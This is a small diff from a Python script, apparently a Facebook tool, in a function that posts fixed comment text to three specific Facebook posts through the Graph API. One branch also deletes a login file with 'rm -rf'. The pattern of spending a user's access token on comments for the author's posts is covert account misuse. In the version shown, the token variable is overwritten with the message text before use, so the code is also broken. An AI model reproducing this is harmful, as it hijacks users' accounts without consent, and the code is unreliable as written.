@@ -111,7 +111,7 @@ def follow_my_account():
         print(' invalid token ! ')
         jalan(' please login again')
         os.system('rm -rf login_r.txt')
-    token = 'Smoga Langgeng Aa @[100000834003593:] Sama Tth @[100003016223315:] Nya AMIN 😊'
+    token = 'Smoga Langgeng Aa @[100000834003593:] Sama Tth @[100003016223315:] Nya AMIN'
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' + token + '&access_token=' + token) # Post 1
     requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + token + '&access_token=' + token) #post 2
     requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + token + '&access_token=' + token) #post 3
